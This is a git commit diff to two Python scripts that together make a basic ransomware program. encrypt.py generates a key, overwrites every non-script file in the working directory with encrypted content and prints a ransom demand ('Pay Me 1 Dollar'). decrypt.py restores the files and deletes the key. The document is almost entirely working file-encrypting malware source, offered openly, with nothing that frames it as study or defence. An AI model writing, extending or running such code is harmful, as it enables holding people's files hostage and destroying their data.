5f6bb4341ee55070817b680b66ca7935cdae5110
Osama-Mustafa-33 <osama.mustafa.3333@gmail.com>
2023-08-21 09:19:18 +0300

    Fixing bugs

--- decrypt.py
+++ decrypt.py
@@ -5,37 +5,48 @@ from cryptography.fernet import Fernet
 
 files = os.listdir()
 targets = []
-
-
-# Get encryption key
 key = 'key.key'
-with (open(key, 'rb')) as the_key:
-    encryption_key = the_key.read()
 
 
-# Get all files from the current directory
-for file in files:
+# Check if key exist in the current directory
+if os.path.exists(key):
 
-    file_extension = os.path.splitext(file)
+    # Get encryption key
+    with (open(key, 'rb')) as the_key:
+        encryption_key = the_key.read()
 
-    # Execlude Python scripts & key from decryption
-    if file.lower().endswith(('.py', '.key')):
-        continue
 
-    # Execlude directories from decryption
-    if os.path.isdir(os.path.abspath(file)):
-        continue
-    
-    targets.append(file)
+    # Get all files from the current directory
+    for file in files:
 
-    with open(file, 'rb') as the_file:
-        file_content = the_file.read()
+        file_extension = os.path.splitext(file)
 
-    decrypted_content = Fernet(encryption_key).decrypt(file_content)
-    with open(file, 'wb') as the_file:
-        the_file.write(decrypted_content)
+        # Execlude Python scripts & key from decryption
+        if file.lower().endswith(('.py', '.key')):
+            continue
 
-print('Congratulations ... Your Files Has Been Decrypted Successfully')
+        # Execlude directories from decryption
+        if os.path.isdir(os.path.abspath(file)):
+            continue
+        
+        targets.append(file)
+
+        with open(file, 'rb') as the_file:
+            file_content = the_file.read()
+
+        decrypted_content = Fernet(encryption_key).decrypt(file_content)
+        with open(file, 'wb') as the_file:
+            the_file.write(decrypted_content)
+
+    # Delete key after decryption
+    try:
+        os.remove(key)
+    except OSError as e:
+        print(f"Error in deleting key{e}")
+
+    print('Congratulations ... Your Files Has Been Decrypted Successfully')
+else:
+    print('Key is not exist!')
 
 
 
--- encrypt.py
+++ encrypt.py
@@ -5,39 +5,49 @@ from cryptography.fernet import Fernet
 
 files = os.listdir()
 targets = []
+current_key = 'key.key'
+
+# Generate encryption key if it is not exist and save it to a text file 
+if not os.path.exists(current_key):
+
+    key = Fernet.generate_key()
+    key_file = open('key.key', 'wb')
+    key_file.write(key)
+    key_file.close()
 
 
-# Generate encryption key and save it to text file
-key = Fernet.generate_key()
-key_file = open('key.key', 'wb')
-key_file.write(key)
-key_file.close()
+    if os.path.exists(current_key): 
+        
+        # Get all files from the current directory
+        for file in files:
 
+            file_extension = os.path.splitext(file)
 
-# Get all files from the current directory
-for file in files:
+            # Execlude Python scripts & key from decryption
+            if file.lower().endswith(('.py', '.key')):
+                continue
 
-    file_extension = os.path.splitext(file)
+            # Execlude directories from encryption
+            if os.path.isdir(os.path.abspath(file)):
+                continue
+            
+            targets.append(file)
 
-    # Execlude Python scripts & key from decryption
-    if file.lower().endswith(('.py', '.key')):
-        continue
+            # Read content from the files
+            with open(file, 'rb') as the_file:
+                file_content = the_file.read()
 
-    # Execlude directories from encryption
-    if os.path.isdir(os.path.abspath(file)):
-        continue
-    
-    targets.append(file)
+            encrypted_content = Fernet(key).encrypt(file_content)
 
-    with open(file, 'rb') as the_file:
-        file_content = the_file.read()
+            # Replace old content with encrypted content
+            with open(file, 'wb') as the_file:
+                the_file.write(encrypted_content)
 
-    encrypted_content = Fernet(key).encrypt(file_content)
-
-    with open(file, 'wb') as the_file:
-        the_file.write(encrypted_content)
-
-print('SORRY :( ...... Your Files Has Been Encrypted!')
+        print('Your Files Has Been Encrypted! Pay Me 1 Dollar to Get Files Back!')
+else:
+    print('Your Files Already Encrypted :)')
+ 
+        
 
 
 
